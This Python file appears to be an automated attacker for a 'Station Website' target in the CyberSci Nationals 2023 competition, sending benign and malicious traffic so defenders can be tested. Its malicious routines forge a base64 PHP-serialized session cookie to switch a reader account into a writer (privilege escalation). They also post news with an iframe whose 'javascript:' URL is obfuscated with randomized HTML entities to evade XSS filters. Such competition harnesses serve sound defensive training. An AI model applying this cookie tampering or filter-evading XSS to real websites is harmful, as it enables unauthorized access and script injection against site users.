#!/usr/bin/env python3
#
# CyberSci Nationals 2023
#
# Dmitriy Beryoza (0xd13a)
#
# Attacker for Station Website

import requests
import traceback
import base64
import urllib3
import urllib
import random
from pathlib import Path
from faker import Faker
from siege.attacker.attacker import Attacker
from siege.core.attack_result import AttackResult

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

fake = Faker()
random.seed(0)
Faker.seed(0)

REQUEST_TIMEOUT = 3

USER_READER = 1
USER_WRITER = 0


class StationWebsiteAttacker(Attacker):

    LOGIN_API = "http://{}:{}/login.php"
    PORTAL_API = "http://{}:{}/portal.php"

    filled = 0
    spent = 0
    good_users: dict[str, str] = {}
    good_usernames: list[str] = []
    bad_users: dict[str, str] = {}
    bad_usernames: list[str] = []

    def load_users(self):

        with open(Path(__file__).parent / "sw-attack-good-users.csv", "r") as file:
            for line in file.readlines():
                username, pwd, _, monitor_only = line.strip().split(",")
                self.good_users[username] = (pwd, int(monitor_only))
        self.good_usernames = list(self.good_users.keys())

        with open(Path(__file__).parent / "sw-attack-bad-users.csv", "r") as file:
            for line in file.readlines():
                username, pwd, _, monitor_only = line.strip().split(",")
                self.bad_users[username] = (pwd, int(monitor_only))
        self.bad_usernames = list(self.bad_users.keys())

    def __init__(self, host, port):
        super().__init__(host, port)
        self.load_users()

    def success_login(self):

        rand_user = random.choice(self.good_usernames)
        val = self.good_users[rand_user]

        payload = {"username": rand_user, "password": val[0]}

        print('sw - {}:{}'.format(rand_user, val[0]))
        r = requests.post(url=self.LOGIN_API.format(self.host, self.port),
                          data=payload, timeout=REQUEST_TIMEOUT,
                          headers={"Content-Type":
                                   "application/x-www-form-urlencoded"},
                          verify=False)

        if r.status_code == 200:
            return AttackResult.RESULT_SUCCESS

        return AttackResult.RESULT_FAILURE

    def bad_login(self):

        rand_user = random.choice(self.bad_usernames)
        val = self.bad_users[rand_user]

        payload = {"username": rand_user, "password": val[0]}

        print('sw - {}:{}'.format(rand_user, val[0]))
        r = requests.post(url=self.LOGIN_API.format(self.host, self.port),
                          data=payload, timeout=REQUEST_TIMEOUT,
                          headers={"Content-Type":
                                   "application/x-www-form-urlencoded"},
                          verify=False)

        if r.status_code == 200:
            return AttackResult.RESULT_SUCCESS

        return AttackResult.RESULT_FAILURE

    def no_priv_escalation(self):

        while True:
            rand_user = random.choice(self.good_usernames)
            val = self.good_users[rand_user]
            # Types are: 0: Reader, 1: Writer
            if val[1] == USER_WRITER:
                break

        payload = {"username": rand_user, "password": val[0]}

        print('sw - {}:{}'.format(rand_user, val[0]))
        r = requests.post(url=self.LOGIN_API.format(self.host, self.port),
                          data=payload, timeout=REQUEST_TIMEOUT,
                          headers={"Content-Type":
                                   "application/x-www-form-urlencoded"},
                          verify=False)

        if r.status_code != 200:
            return AttackResult.RESULT_FAILURE

        if 'Enter news text to post (do not add any scripting!):' in r.text:
            return AttackResult.RESULT_SUCCESS

        return AttackResult.RESULT_FAILURE

    def get_cookies_from_response(self, response: requests.Response) -> dict:
        """Given a response, return all cookies as a dict."""
        cookies = response.cookies.get_dict()
        # If there was a redirect, the cookies we need may be in a previous
        # response
        for r in response.history:
            cookies.update(r.cookies.get_dict())  # Merge cookies

        return cookies

    def priv_escalation(self):
        while True:
            rand_user = random.choice(self.good_usernames)
            val = self.good_users[rand_user]
            # Types are: 0: Reader, 1: Writer
            if val[1] == USER_READER:
                break

        payload = {"username": rand_user, "password": val[0]}

        print('sw - {}:{}'.format(rand_user, val[0]))
        r = requests.post(url=self.LOGIN_API.format(self.host, self.port),
                          data=payload, timeout=REQUEST_TIMEOUT,
                          headers={"Content-Type":
                                   "application/x-www-form-urlencoded"},
                          verify=False)

        if r.status_code != 200:
            return AttackResult.RESULT_FAILURE

        cookies = self.get_cookies_from_response(r)

        token = cookies.get("token")
        if token is None:
            return AttackResult.RESULT_FAILURE

        token = base64.b64decode(urllib.parse.unquote(token)).decode('utf-8')
        if '"is_reader";s:1:"1"' not in token:
            return AttackResult.RESULT_FAILURE

        token = token.replace('"is_reader";s:1:"1"', '"is_reader";s:1:"0"')

        token = base64.b64encode(token.encode('utf-8')).decode('utf-8')

        r = requests.get(url=self.PORTAL_API.format(self.host, self.port),
                         timeout=REQUEST_TIMEOUT, cookies={"token": token},
                         verify=False)

        if 'Enter news text to post (do not add any scripting!):' in r.text:
            return AttackResult.RESULT_SUCCESS

        return AttackResult.RESULT_FAILURE

    def obfuscate(self, val):
        out = ""
        for c in val:
            i = random.randint(0, 2)
            if i == 0:
                out += c
            if i == 1:
                out += '&#' + ('0' * random.randint(0, 5)) + str(ord(c)) + ';'
            if i == 2:
                v = hex(ord(c))[2:]
                out += '&#' + random.choice(['x', 'X']) + \
                    ('0' * random.randint(0, 5)) + \
                    random.choice([v, v.upper()]) + ';'

        # print(out)
        return out

    def gen_fake_data(self, benign):

        payload = ""
        for _ in range(3):
            sent = fake.sentence()
            r = random.randint(0, 3)
            if r == 0:
                sent = "<i>" + sent + "</i>"
            if r == 1:
                sent = "<u>" + sent + "</u>"
            if r == 2:
                sent = "<b>" + sent + "</b>"
            payload += "<p>" + sent + "</p>"

        if benign:
            val = self.obfuscate("https://nuclearsafety.gc.ca/")
        else:
            val = self.obfuscate("javascript:alert('Hacked!');")
        payload += '<iframe src="' + val + '"></iframe>'
        return payload

    def generate_posting(self, benign):
        while True:
            rand_user = random.choice(self.good_usernames)
            val = self.good_users[rand_user]
            # Types are: 0: Reader, 1: Writer
            if val[1] == USER_WRITER:
                break

        payload = {"username": rand_user, "password": val[0]}

        print('sw - {}:{}'.format(rand_user, val[0]))
        r = requests.post(url=self.LOGIN_API.format(self.host, self.port),
                          data=payload, timeout=REQUEST_TIMEOUT,
                          headers={"Content-Type":
                                   "application/x-www-form-urlencoded"},
                          verify=False)

        if r.status_code != 200:
            return AttackResult.RESULT_FAILURE

        cookies = self.get_cookies_from_response(r)

        token = cookies.get("token")

        news_text = self.gen_fake_data(benign)

        payload = {"contents": news_text}

        r = requests.post(url=self.PORTAL_API.format(self.host, self.port),
                          data=payload, timeout=REQUEST_TIMEOUT,
                          cookies={"token": token}, verify=False)

        if r.status_code == 200 and news_text in r.text:
            return AttackResult.RESULT_SUCCESS

        return AttackResult.RESULT_FAILURE

    def good_posting(self):
        return self.generate_posting(True)

    def bad_posting(self):
        return self.generate_posting(False)

    def benign_request(self, id, tick, sequence_no):
        try:
            if id == 1:
                return self.success_login()
            elif id == 2:
                return self.no_priv_escalation()
            elif id == 3:
                return self.good_posting()
        except BaseException:
            traceback.print_exc()
            return AttackResult.RESULT_DOWN
        raise Exception("Unknown request type '{}'".format(id))

    def malicious_request(self, id, tick, sequence_no):
        try:
            if id == 1:
                return self.bad_login()
            elif id == 2:
                return self.priv_escalation()
            elif id == 3:
                return self.bad_posting()
        except BaseException:
            traceback.print_exc()
            return AttackResult.RESULT_DOWN
        raise Exception("Unknown request type '{}'".format(id))
